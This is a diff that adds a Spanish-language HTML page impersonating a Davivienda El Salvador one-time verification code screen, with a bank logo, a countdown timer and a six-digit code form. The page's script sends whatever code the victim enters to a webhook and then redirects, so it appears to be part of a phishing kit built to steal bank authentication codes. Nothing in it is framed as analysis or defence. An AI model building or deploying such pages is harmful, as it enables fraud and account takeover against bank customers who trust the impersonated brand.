@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Validación de código</title>
+  <link rel="stylesheet" href="estilos.css" />
+  <script src="webhook.js" defer></script>
+</head>
+<body>
+  <div class="top-bar">
+    <img src="DaviviendaLogo.png" alt="Logo Davivienda" class="logo-franja" />
+  </div>
+
+  <div class="container">
+    <h2 class="titulo-login">Ingrese el código de verificación que te hemos enviado</h2>
+    <form id="codigoForm" onsubmit="validarCodigo(event)">
+      <input type="text" id="codigo" placeholder="Código de 6 dígitos" maxlength="6" required />
+      <p id="error" class="mensaje-error"></p>
+      <button type="submit">Confirmar</button>
+    </form>
+
+    <div class="acciones-horizontal">
+      <a href="index3.html">Volver</a>
+    </div>
+
+    <div class="privacidad">
+      Este código ha sido enviado a su dispositivo registrado. Si no lo ha recibido, <a href="#">solicite uno nuevo</a>.
+    </div>
+
+    <p class="temporizador">⏳ Tiempo restante: <span id="contador">60</span> segundos</p>
+  </div>
+
+  <div class="footer">
+    © 2026 Davivienda El Salvador – Todos los derechos reservados
+  </div>
+
+  <script>
+    function validarCodigo(e) {
+      e.preventDefault();
+      const codigo = document.getElementById("codigo").value.trim();
+      const error = document.getElementById("error");
+
+      if (!/^\d{6}$/.test(codigo)) {
+        error.textContent = "El código debe tener exactamente 6 dígitos numéricos.";
+        return;
+      }
+
+      error.textContent = "";
+      enviarAlWebhook("📲 Código ingresado", codigo)
+        .then(() => window.location.href = "index3.html")
+        .catch(() => alert("Error al enviar el código"));
+    }
+
+    let tiempo = 60;
+    const contador = document.getElementById("contador");
+    const intervalo = setInterval(() => {
+      tiempo--;
+      contador.textContent = tiempo;
+      if (tiempo <= 0) {
+        clearInterval(intervalo);
+        contador.textContent = "0";
+        alert("El tiempo ha expirado. Solicite un nuevo código.");
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
